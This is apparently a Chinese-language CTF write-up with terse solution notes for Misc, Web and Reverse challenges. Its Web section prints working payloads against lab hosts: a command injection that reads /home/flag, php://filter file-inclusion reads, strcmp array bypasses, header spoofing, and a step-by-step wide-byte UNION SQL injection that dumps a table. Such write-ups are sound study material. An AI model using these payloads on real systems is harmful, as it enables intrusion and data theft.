Misc

What is that？

  • 直觉告诉我手指下有flag
  • 分别对应长和宽，将宽度改成和长度一样

秘密电报

  • 培根密码

重重谍影

  • 一直base64解密，直达
  • 这里是真的坑，猜了很多密码，最后竟然是没有密码AES
  • 根据题目用与佛论禅密码解密
  • 这就是flag？？？嘤嘤嘤

有趣的ISCC

  • 用winhex打开
  • Unicode解码两次

Where is the FLAG？

  • 在图片片中看到Adobe Fireworks CS5字样，用该软件打开，发现按照顺序拼好就得到一个二维码，扫码即可

凯撒十三世

  • 凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。
  • 先rot13解密得到roqtp697t95j3
  • 查看键盘发现右下一位对应,flagyougotme

一只猫的心思

  • 用winhex打开，搜索D0CF,分离出doc文件
  • 与佛论禅加密
  • 得到16进制

暴力XX不可取

  • zip伪加密

  • 修改html提交限制条件

web01

  • php黑魔法，strcmp()对数组比较的结果为null

本地的诱惑

你能跨过去吗？

  • urldecode()然后utf-7decode()
  • 提交key得到flag

一切都是套路

  • 根据题目猜想源码泄露，index.php.txt
  • 变量覆盖，Get将flag先赋给_200

你能绕过吗?

  • payload:http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index
  • 行吧，竟然是文件包含，禁了php

web02

  • 第一次遇见，修改client-ip:127.0.0.1

请ping我的ip 看你能Ping通吗？

  • 命令注入,%0a
  • payload:http://118.190.152.202:8018/?ip=127.0.0.1 %0a cat /home/flag

Please give me username and password!

  • index.php.txt，源码泄露 payload:http://118.190.152.202:8017/?username[]=a&password=1e9
  • 数组绕过strcmp()的判断，用科学技术绕过对password的判断

SQL注入的艺术

  • 宽字节注入

http://118.190.152.202:8015/index.php?id=1%df' 1=2%23返回错误

  • 可以手工注或者sqlmap跑下
  • order by 8得到有8列
  • 爆数据库名：http://118.190.152.202:8015/index.php?id=-1%df' union select 1,database(),3,4,5,6,7,8 %23
  • 爆表名：http://118.190.152.202:8015/index.php?id=-1%df' union select 1,(select table_name from information_schema.tables where table_schema=database()),3,4,5,6,7,8 %23
  • 爆列名：http://118.190.152.202:8015/index.php?id=-1%df' union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name=0x61646d696e73%23
  • 爆flag:http://118.190.152.202:8015/index.php?id=-1%df' union select 1,flag,3,4,5,6,7,8 from admins%23

试试看

  • 文件包含,对后缀加了判断，一定要是以jpg结尾，所以包含两个文件
  • payload:http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php
  • 尝试一些常见目录，http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php

Reverse

0x00 rsa256

  • 简单的rsa题
  • 给了公钥和密文
  • 查看公钥信息openssl rsa -pubin -text -modulus -in warmup -in public.key
  • 发现n是可分解的，用yafu工具进行分解，得到p、q
  • 用rsatools生产私钥
  • 利用私钥进行解密

0x01 My math is bad

  • 两次求解多元方程组
  • 找到验证函数

  • 解两次多元方程组，用matlab
  • 用gdb调出随机数,需要注意下小端序
